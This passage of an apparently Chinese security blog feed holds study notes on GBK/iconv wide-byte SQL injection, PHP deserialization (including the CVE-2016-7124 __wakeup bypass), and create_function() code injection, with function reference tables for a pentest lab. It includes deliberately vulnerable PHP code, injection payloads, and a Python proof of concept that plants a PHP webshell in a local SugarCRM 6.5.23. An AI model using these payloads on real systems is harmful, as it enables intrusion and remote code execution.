<h2 id="inconv导致的致命后果"><a href="#inconv导致的致命后果" class="headerlink" title="inconv导致的致命后果"></a>inconv导致的致命后果</h2><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;toor!@#$&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>可以看到，它在sql语句执行前，将character_set_client设置成了binary，所以可以避免宽字符注入的问题。但之后其调用了iconv将已经过滤过的参数$id给转换了一下。</p>
<p>给id参数一个值：錦’<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql11.png" alt=""></p>
<p>报错了。说明可以注入。</p>
<p>“錦“这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。<br>\的ascii码正是5c。那么，当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<p>正利用了绕过addslashes的两种方式的第一种：将\转义掉。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/反序列化漏洞的利用与学习.html</id>
    <published>2017-07-28T01:39:51.000Z</published>
    <updated>2017-08-02T01:14:33.225Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="external">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造一个序列化的对象A并给其中变量a赋值为&lt;?php phpinfo();?&gt;如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php1.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php2.png" alt=""><br>如上成功将&lt;?php phpinfo();?&gt;写入1.php.</p>
<h3 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h3><h4 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h4><p>PHP之前爆出了一个漏洞（<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">CVE-2016-7124</a> ），简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">	function __wakeup()</div><div class="line">    	&#123;</div><div class="line">        	foreach(get_object_vars($this) as $k =&gt; $v) &#123;</div><div class="line">            		$this-&gt;$k = null;</div><div class="line">        	&#125;</div><div class="line">        	echo &quot;Waking up...\n&quot;;</div><div class="line">    	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>我们再次使用之前的payload测试，结果如下：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php3.png" alt=""><br>发现__wakeup函数成功执行，清除了对象属性，从而1.php内容也为空了。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>根据CVE-2016-7124的原理，将上面payload中A的个数变成2或者大于2的数字如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:”A”:2:&#123;s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;&#125;</div></pre></td></tr></table></figure></p>
<p>然后再次执行发现绕过了__wakeup函数，成功将phpinfo()写入1.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/php4.png" alt=""></p>
<h4 id="SugarCRM-v6-5-23-PHP反序列化"><a href="#SugarCRM-v6-5-23-PHP反序列化" class="headerlink" title="SugarCRM v6.5.23 PHP反序列化"></a>SugarCRM v6.5.23 PHP反序列化</h4><p>漏洞分析：<a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br>漏洞环境：<a href="https://github.com/sugarcrm/sugarcrm_dev/tree/6.5.23/" target="_blank" rel="external">SugarCRM v6.5.23</a></p>
<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests as req</div><div class="line"></div><div class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</div><div class="line"></div><div class="line">data = &#123;  </div><div class="line">    &apos;method&apos;: &apos;login&apos;,</div><div class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</div><div class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">req.post(url, data=data)</div></pre></td></tr></table></figure></p>
<p>脚本执行后shell位于custom/1.php：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php5.png" alt=""></p>
<h2 id="Java反序列化漏洞（待续）"><a href="#Java反序列化漏洞（待续）" class="headerlink" title="Java反序列化漏洞（待续）"></a>Java反序列化漏洞（待续）</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="external">PHP反序列化漏洞与CVE-2016-7124</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Web For Pentester I 练习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/Web-For-Pentester-I-练习笔记.html</id>
    <published>2017-07-20T07:07:46.000Z</published>
    <updated>2017-07-24T02:18:54.264Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="external">web_for_pentester_i386.iso</a></p>
<p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int preg_match( string pattern, string subject [, array matches ] )</div></pre></td></tr></table></figure>
<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配检索的对象</td>
</tr>
<tr>
<td>matches</td>
<td style="text-align:center">可选，存储匹配结果的数组， matches[0] 将包含与整个模式匹配的文本 matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</td>
</tr>
</tbody>
</table>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<h3 id="正则表达式中的模式修正符"><a href="#正则表达式中的模式修正符" class="headerlink" title="正则表达式中的模式修正符"></a>正则表达式中的模式修正符</h3><p>模式修正符就是字母，只不过这些在模式修正符的应用之中有特殊的含义。下面我来看看都有哪些模式修正符，请看下表： </p>
<table>
<thead>
<tr>
<th>模式修正符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:center">表示在和模式进行匹配进不区分大小写</td>
</tr>
<tr>
<td>m</td>
<td style="text-align:center">将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</td>
</tr>
<tr>
<td>s</td>
<td style="text-align:center">如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:center">表示模式中的空白忽略不计</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:center">正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">以模式字符串开头，相当于元字符^</td>
</tr>
<tr>
<td>Z</td>
<td style="text-align:center">以模式字符串结尾，相当于元字符$</td>
</tr>
<tr>
<td>U</td>
<td style="text-align:center">正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</td>
</tr>
</tbody>
</table>
<h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p>prompt() 方法用于显示可提示用户进行输入的对话框</p>
<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">prompt(text,defaultText)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>text</td>
<td style="text-align:center">可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）。</td>
</tr>
<tr>
<td>defaultText</td>
<td style="text-align:center">可选。默认的输入文本。</td>
</tr>
</tbody>
</table>
<h3 id="confirm"><a href="#confirm" class="headerlink" title="confirm()"></a>confirm()</h3><p>confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。</p>
<h4 id="语法：-3"><a href="#语法：-3" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">confirm(message)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-3"><a href="#参数说明：-3" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>message</td>
<td style="text-align:center">要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td>
</tr>
</tbody>
</table>
<h3 id="fromCharCode"><a href="#fromCharCode" class="headerlink" title="fromCharCode()"></a>fromCharCode()</h3><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
<h4 id="语法：-4"><a href="#语法：-4" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(numX,numX,...,numX)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-4"><a href="#参数说明：-4" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>numX</td>
<td style="text-align:center">必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</td>
</tr>
</tbody>
</table>
<h3 id="eval-string"><a href="#eval-string" class="headerlink" title="eval(string)"></a>eval(string)</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
<h4 id="语法：-5"><a href="#语法：-5" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-5"><a href="#参数说明：-5" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。要计算的字符串，其中含有要计算的 JavaScript 表达式或要执行的语句。</td>
</tr>
</tbody>
</table>
<h3 id="Document-write"><a href="#Document-write" class="headerlink" title="Document.write()"></a>Document.write()</h3><p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
<h4 id="语法：-6"><a href="#语法：-6" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(exp1,exp2,exp3,....)</div></pre></td></tr></table></figure>
<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>假设当前的URL是<a href="http://www.uknowsec/test.htm#PART2：" target="_blank" rel="external">http://www.uknowsec/test.htm#PART2：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">document.write(location.hash);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>以上实例输出结果：</p>
<p>#part2</p>
<h3 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
<h4 id="语法：-7"><a href="#语法：-7" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stringObject.substring(start,stop)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-6"><a href="#参数说明：-6" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>start</td>
<td style="text-align:center">必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。</td>
</tr>
<tr>
<td>stop</td>
<td style="text-align:center">可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。</td>
</tr>
</tbody>
</table>
<h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h3><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<h4 id="语法：-8"><a href="#语法：-8" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strstr(string,search,before_search)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-7"><a href="#参数说明：-7" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td>search</td>
<td style="text-align:center">必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td>before_search</td>
<td style="text-align:center">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody>
</table>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4 id="语法：-9"><a href="#语法：-9" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-8"><a href="#参数说明：-8" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><h4 id="测试环境版本："><a href="#测试环境版本：" class="headerlink" title="测试环境版本："></a>测试环境版本：</h4><p>apache +php 5.2、apache +php 5.3</p>
<h4 id="有问题的代码："><a href="#有问题的代码：" class="headerlink" title="有问题的代码："></a>有问题的代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//02-8.php?id=2;&#125;phpinfo();/*</div><div class="line">$id=$_GET[&apos;id&apos;];</div><div class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</div><div class="line">echo $str2;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">$f1 = create_function(&apos;$a&apos;,$str2);</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</div></pre></td></tr></table></figure>
<h4 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h4><p>由于id=2;}phpinfo();/*<br>执行函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">源代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;.$a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注入后代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;;&#125;</div><div class="line">  phpinfo();/*;//此处为注入代码。</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<h4 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h4><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符<br>rtrim() - 移除字符串右侧的空白字符或其他预定义字符</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">trim(string,charlist)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-9"><a href="#参数说明：-9" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>charlist</td>
<td style="text-align:center">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： “\0” - NULL “\t” - 制表符 “\n” - 换行 “\x0B” - 垂直制表符 “\r” - 回车 “ “ - 空格</td>
</tr>
</tbody>
</table>
<h3 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities()"></a>htmlentities()</h3><p>htmlentities() 函数把字符转换为 HTML 实体。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">htmlentities(string,flags,character-set,double_encode)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-10"><a href="#参数说明：-10" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>flags</td>
<td style="text-align:center">可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</td>
</tr>
<tr>
<td>character-set</td>
<td style="text-align:center">可选。一个规定了要使用的字符集的字符串。</td>
</tr>
<tr>
<td>double_encode</td>
<td style="text-align:center">可选。布尔值，规定是否编码已存在的 HTML 实体。 TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。</td>
</tr>
</tbody>
</table>
<h3 id="header"><a href="#header" class="headerlink" title="header()"></a>header()</h3><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<h4 id="语法：-10"><a href="#语法：-10" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(string,replace,http_response_code)</div></pre></td></tr></table></figure>
